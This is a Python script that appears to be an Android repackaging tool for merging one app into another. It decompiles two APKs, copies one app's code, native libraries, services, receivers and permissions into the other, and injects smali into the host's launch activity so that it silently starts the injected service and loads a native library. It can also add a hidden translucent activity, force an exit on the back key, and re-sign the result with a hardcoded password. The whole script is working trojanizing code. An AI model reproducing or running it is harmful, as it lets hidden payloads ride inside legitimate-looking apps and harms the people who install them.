# coding:utf8

import os
import random
import re
import subprocess
import shutil
from functools import reduce
from os.path import abspath
from io import open
import sys

try:
    import xml.etree.cElementTree as ET
except ImportError:
    import xml.etree.ElementTree as ET

curDir = os.path.split(os.path.abspath(sys.argv[0]))[0]
print("file dir " + curDir)
outDir = curDir + '/../out'
apktool = curDir + '/../tools/apktool_2.3.1.jar'
# srcApk = '../com.csfo.omys___pie.apk'
# targetApk = '../app-release.apk'
aapt = curDir + '/../tools/aapt.exe'

key = '{http://schemas.android.com/apk/res/android}name'

keystory_alias_password = "123123"
keystory_store_password = "123123"
# keystory_store = "../Everychange.key"
# keystory_alias = "com.moe.omo"

tmpApk = "tmp.apk"


def unpack(src, dist):
    dist = os.path.join(dist, fileName(src))

    print("[+] unpack: " + src)
    if os.path.exists(dist):
        shutil.rmtree(dist)

    cmd = ['java', '-jar', os.path.abspath(apktool), 'd', src, '-f', '-o', dist]
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        code = process.wait()
        if not code == 0:
            raise Exception("unpack failed:" + str(stderr.decode("utf-8")))
        else:
            pass
            # print("[+] " + str(stdout, encoding="utf-8"))
    except Exception as e:
        print('[-]' + str(e))
        raise e


def copytree(src, dst, symlinks=False):
    names = os.listdir(src)
    if not os.path.isdir(dst):
        os.makedirs(dst)
    errors = []
    for name in names:
        srcname = os.path.join(src, name)
        dstname = os.path.join(dst, name)
        try:
            if symlinks and os.path.islink(srcname):
                linkto = os.readlink(srcname)
                os.symlink(linkto, dstname)
            elif os.path.isdir(srcname):
                copytree(srcname, dstname, symlinks)
            else:
                if os.path.isdir(dstname):
                    os.rmdir(dstname)
                elif os.path.isfile(dstname):
                    os.remove(dstname)
                shutil.copy2(srcname, dstname)
        except (IOError, os.error) as why:
            errors.append((srcname, dstname, str(why)))
        except OSError as err:
            errors.extend(err.args[0])

        try:
            shutil.copystat(src, dst)
        except WindowsError:
            pass
        except OSError as why:
            errors.extend((src, dst, str(why)))
        if errors:
            raise shutil.Error(errors)


def fileName(f):
    return os.path.basename(f).split('.apk')[0]


def rePackage(src, dst):
    try:
        src = os.path.abspath(os.path.normpath(src))
        print("[+] repackage ", src, " -> ", dst)
        cmd = ['java', '-jar', apktool, 'b', src, '-f', '-o', dst]
        p = subprocess.Popen(cmd)
        p.wait()
    except Exception as e:
        print("[-]" + str(e))
        exit(-1)


def main():
    # process()
    mergeManifest(r"E:\PycharmProjects\repacktool\out\app-release", r"E:\PycharmProjects\repacktool\out\com.bxdw.omzw___pie"
                  , r"E:\PycharmProjects\repacktool\out\IMEI_Show", "", True)
    pass


def process(src, dst, keyalias, keydir, rpackename, dynamic, gp):
    global servicePckName
    srcApk = src
    targetApk = dst
    dynamicApk = dynamic
    keystory_alias = keyalias
    out_src_dir = os.path.join(outDir, fileName(srcApk))
    out_dst_dir = os.path.join(outDir, fileName(targetApk))
    out_dyn_dir = os.path.join(outDir, fileName(dynamicApk))
    apks = [srcApk, targetApk]
    if gp:
        apks.append(dynamicApk)

    for apk in apks:
        unpack(os.path.abspath(apk), os.path.abspath(outDir))
    mergeApk(out_dst_dir, out_src_dir, out_dyn_dir, rpackename, gp)
    tmpApk_dir = os.path.join(outDir, tmpApk)
    signApk_dir = os.path.join(outDir, fileName(targetApk) + ".apk")
    rePackage(out_dst_dir, abspath(tmpApk_dir))
    signApk(abspath(tmpApk_dir), abspath(signApk_dir), keystory_alias, abspath(keydir))

    removeTempFiles(tmpApk_dir)


def removeTempFiles(tmpApk_dir):
    print("[**] remove temporary files....")
    try:
        os.remove(abspath(tmpApk_dir))
        for dir in os.listdir(abspath(outDir)):
            file = os.path.join(abspath(outDir), dir);
            if os.path.isdir(file):
                shutil.rmtree(file)
    except:
        pass

    print("[+] packed finish!!")


def mergeApk(out_dst_dir, out_src_dir, out_dyn_dir, rePackageName, gp):
    copy_srcapk_file(out_dst_dir, out_src_dir)
    dst_activityList, dst_root, src_root = mergeManifest(out_src_dir, out_dst_dir, out_dyn_dir, rePackageName, gp)
    setStartService(dst_activityList, dst_root, out_dst_dir, src_root, gp)


def setStartService(dst_activityList, dst_root, out_dst_dir, src_root, gp):
    global servicePckName
    onCreateClass = dst_root.find("application").attrib.get(key, None)
    servicePckName = getSourceServiceNameList(src_root)[0].replace(".", "/")
    print("[+] " + servicePckName)
    if onCreateClass == None:
        for activity in dst_activityList:
            for i in activity.findall('intent-filter'):
                actions = i.findall('action')
                category = i.findall('category')
                l = [a.attrib.get(key) for a in actions]
                l += [a.attrib.get(key) for a in category]

                if 'android.intent.action.MAIN' in l and 'android.intent.category.LAUNCHER' in l:
                    onCreateClass = activity.attrib.get(key)
                    break

    if not onCreateClass:
        raise Exception("find onCreate fail!")

    print("[+] " + onCreateClass)
    classPath = os.path.join(out_dst_dir, "smali", onCreateClass.replace('.', '/') + ".smali")
    wstr = ""
    with open(os.path.normpath(classPath), 'r', encoding='utf-8') as f:
        match = False
        inject = False
        for line in f:
            if re.search("^\.method (protected|public) onCreate\((Landroid/os/Bundle;)?\)V$", line):
                print("[+] %s find onCreate: %s" % (onCreateClass, line))
                match = True

            if re.search("\.end method", line) and match:
                match = False
                inject = True

            if match:
                if re.search("return-void", line):
                    oldline = line
                    line = ''
                    if gp:
                        pckname = servicePckName.split('/')
                        line += '\n\tconst-string v0, "%s"\n' % ".".join(pckname[:-1])
                        line += '\n\tinvoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V\n'

                        line += '\n\tinvoke-virtual {p0}, L' + onCreateClass.replace('.',
                                                                                     '/') + ';->getApplicationContext()Landroid/content/Context;\n'

                        line += '\n\tmove-result-object v0\n'

                        line += '\n\tconst/4 v1, 0x0\n'

                        line += '\n\tinvoke-static {v0, v1}, L' + servicePckName + ';->Activity' + ''.join(
                            pckname[-2:-1]) + '_a(Landroid/content/Context;Landroid/content/Intent;)V\n'

                    line += "\n\tnew-instance v0, Landroid/content/Intent;\n\n" \
                            "\tconst-class v1, L" + servicePckName + ";\n\n" \
                                                                     "\tinvoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n\n" \
                                                                     "\tinvoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n\n"
                    if gp:
                        # finish
                        line += '\n\tinvoke-virtual{p0}, L%s;->finish()V\n' % (onCreateClass.replace('.', '/'),)
                    line += oldline

                if re.search("\.locals (\d)", line):
                    pattern = re.match("(\s*\.locals )(\d)", line)
                    if int(pattern.group(2)) < 3:
                        line = pattern.group(1) + "3\n"

            wstr += line

        f.close()
        if not inject:
            raise Exception("set start service failed! " + onCreateClass)
    with open(classPath, 'w') as f:
        if gp:
            wstr += addExitCode(onCreateClass)
        f.writelines(wstr)
        f.close()

def addExitCode(activity):
    line = '\n\n'
    line += '.method public onKeyDown(ILandroid/view/KeyEvent;)Z\n'
    line += '\t.locals 2\n'
    line += '\t.param p1, "keyCode"  # I\n'
    line += '\t.param p2, "event"  # Landroid/view/KeyEvent;\n\n'

    line += '\t.prologue\n'
    line += '\tconst/4 v0, 0x0\n\n'

    line += '\t.line 122\n'
    line += '\tconst/4 v1, 0x4\n\n'

    line += '\tif-ne p1, v1,:cond_0\n\n'

    line += '\t.line 123\n\n'
    line += '\tinvoke-virtual {p0}, L%s;->finish()V\n\n' % activity.replace('.', '/')

    line += '\t.line 124\n'
    line += '\tinvoke-static {v0}, Ljava/lang/System;->exit(I) V\n\n'

    line += '\t.line 127\n'
    line += '\t:goto_0\n'
    line += '\treturn v0\n\n'

    line += '\t:cond_0\n'
    line += '\tinvoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z\n\n'

    line += '\tmove-result v0\n\n'

    line += '\tgoto:goto_0\n\n'

    line += '.end method'
    return line

def mergeManifest(out_src_dir, out_dst_dir, out_dyn_dir, rpackename, gp):
    srcManifestDir = os.path.join(out_src_dir, 'AndroidManifest.xml')
    dstManifestDir = os.path.join(out_dst_dir, 'AndroidManifest.xml')
    src_tree = parse_Manifest(srcManifestDir)
    src_root = src_tree.getroot()
    dst_tree = parse_Manifest(dstManifestDir)
    dst_root = dst_tree.getroot()
    src_perm = getSourcePermList(src_root)
    dst_perm = getSourcePermList(dst_root)
    # dst_perm = list(src_perm.union(dst_perm))
    # dst_perm = reduce(a, [[], ] + dst_perm)
    metaDataList = getSourceMetadataList(src_root)
    serviceList = getSourceServiceList(src_root)
    activityList = getSourceActList(src_root)
    receiverList = getSourceReceiverList(src_root)
    dst_metaDataList = getSourceMetadataList(dst_root)
    dst_serviceList = getSourceServiceList(dst_root)
    dst_activityList = getSourceActList(dst_root)
    dst_receiverList = getSourceReceiverList(dst_root)
    metaDataList = NameDifference(metaDataList, dst_metaDataList)
    serviceList = NameDifference(serviceList, dst_serviceList)
    receiverList = NameDifference(receiverList, dst_receiverList)

    isgp = gp
    # < activity
    # android:name = "jp.wamo.amo.Activityamo"
    # android:excludeFromRecents = "true"
    # android:theme = "@android:style/Theme.Translucent"
    # android:configChanges = "orientation|keyboardHidden|screenSize" >
    #
    # < / activity >
    if isgp:
        dynManifestDir = os.path.join(out_dyn_dir, 'AndroidManifest.xml')
        dyn_tree = parse_Manifest(dynManifestDir)
        dyn_root = dyn_tree.getroot()
        dyn_perm = getSourcePermList(dyn_root)
        src_perm += dyn_perm
        packagename = dst_root.get("package")
        activityName = packagename + "." + "Activity" + packagename.split('.')[-1]
        dynamicActivity = ET.Element("activity")
        spaname = '{http://schemas.android.com/apk/res/android}'
        dynamicActivity.set("%sname" % spaname, activityName)
        dynamicActivity.set("%sexcludeFromRecents" % spaname, "true")
        dynamicActivity.set("%stheme" % spaname, "@android:style/Theme.Translucent")
        dynamicActivity.set("%sconfigChanges" % spaname, "orientation|keyboardHidden|screenSize")
        dynamicActivity.tail = "\n\t"
        activityList.append(dynamicActivity)
    activityList = NameDifference(activityList, dst_activityList)
    dst_perm = NameDifference(src_perm, dst_perm)
    # print(getSourceMetadataList(src_root))
    for perm in dst_perm:
        if random.randint(0, 1) == 0:
            dst_root.append(perm)
        else:
            dst_root.insert(0, perm)
    for a in dst_root.iter("application"):
        for metadata in metaDataList:
            a.insert(0, metadata)
        for service in serviceList:
            a.append(service)
        for activity in activityList:
            a.append(activity)
        for receiver in receiverList:
            a.append(receiver)
    for i in dst_root:
        for child in i:
            child.tail = '\n\t\t'
    if rpackename:
        dst_root.set("package", rpackename)
    dst_tree.write(dstManifestDir, encoding="utf-8", xml_declaration=True)
    return dst_activityList, dst_root, src_root


def parse_Manifest(srcManifestDir):
    ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
    src_tree = ET.parse(srcManifestDir)
    return src_tree


def copy_srcapk_file(out_dst_dir, out_src_dir):
    srcAssetsDir = os.path.join(out_src_dir, 'assets')
    dstAssetsDir = os.path.join(out_dst_dir, 'assets')
    copytree(os.path.abspath(srcAssetsDir), os.path.abspath(dstAssetsDir))
    srclibDir = os.path.join(out_src_dir, 'lib/armeabi')
    dstlibDir = os.path.join(out_dst_dir, 'lib/armeabi')
    copytree(os.path.abspath(srclibDir), os.path.abspath(dstlibDir))
    srcsmaliDir = os.path.join(out_src_dir, 'smali')
    dstsmaliDir = os.path.join(out_dst_dir, 'smali')
    copytree(os.path.abspath(srcsmaliDir), os.path.abspath(dstsmaliDir))


def signApk(src, dst, keystory_alias, keystory):
    try:
        print("[+] " + "signApk start....", "\nscr: " + src, "dst: " + dst, "\nkeystory: " + keystory,
              "\nalias:" + keystory_alias)
        cmd = ['jarsigner', '-keystore', keystory,
               '-storepass', keystory_store_password, '-keypass', keystory_alias_password, '-signedjar', dst, src,
               keystory_alias]
        p = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        stdout, stderr = p.communicate()
        print("[+] ", stdout.decode("gb2312"))
        code = p.wait()
        if not code == 0:
            print("[-] sign failed: ", stdout.decode("gb2312"))
            exit(-1)
        else:
            print("[+] sign success! -> " + dst)
    except Exception as e:
        print("[-] " + str(e))
        exit(-1)


def a(x, y):
    for a in x:
        if a.attrib == y.attrib:
            return x
    return x + [y]


def getAppBaseInfo(apkpath):
    apkpath = os.path.abspath(apkpath)
    if not os.path.exists(apkpath):
        print("[*] not exists " + apkpath)
    print("[+] " + os.path.abspath(aapt))
    p = subprocess.Popen("%s d badging %s" % (os.path.abspath(aapt), os.path.normpath(apkpath)), shell=True,
                         stdout=subprocess.PIPE)
    # stdout.read().decode("utf")
    # print("[+] " + str(stdout.read().encode("utf-8")))
    l = str(p.stdout.readline().decode("utf-8"))
    print(l)
    match = re.compile(
        "package: name='(\S+)' versionCode='(\d+)' versionName='(\S+)'.*").match(l)
    if not match:
        raise Exception("can't get packageinfo")
    packagename = match.group(1)
    versionCode = match.group(2)
    versionName = match.group(3)
    return packagename, versionCode, versionName


def NameDifference(src, dst):
    df = {}
    for s in src:
        df[s.attrib.get(key)] = s
        for d in dst:
            if d.attrib == s.attrib:
                df.pop(s.attrib.get(key), None)
                break
            else:
                df[s.attrib.get(key)] = s

    return df.values()


def getSourcePermList(doc):
    return doc.findall('uses-permission')


def getSourcePermName(doc):
    nodelist = doc.findall('uses-permission')
    act_list = []
    for node in nodelist:
        act_list.append(node.get('{http://schemas.android.com/apk/res/android}name'))
    return act_list


def getSourcePackageName(manifestDir):
    return parse_Manifest(manifestDir).getroot().get("package")


def getSourceActList(doc):
    return doc.findall('application/activity')


def getSourceActNameList(doc):
    nodelist = doc.findall('application/activity')
    act_list = []
    for node in nodelist:
        act_list.append(node.get('{http://schemas.android.com/apk/res/android}name'))
    return act_list


def getSourceReceiverList(doc):
    return doc.findall('application/receiver')


def getSourceReceiverNameList(doc):
    nodelist = doc.findall('application/receiver')
    receiverList = []
    for node in nodelist:
        receiverList.append(node.get('{http://schemas.android.com/apk/res/android}name'))
    return receiverList


def getSourceServiceList(doc):
    return doc.findall('application/service')


def getSourceServiceNameList(doc):
    nodelist = doc.findall('application/service')
    serviceList = []
    for node in nodelist:
        serviceList.append(node.get('{http://schemas.android.com/apk/res/android}name'))
    return serviceList


def getSourceMetadataList(doc):
    return doc.findall('application/meta-data')


if __name__ == "__main__":
    main()
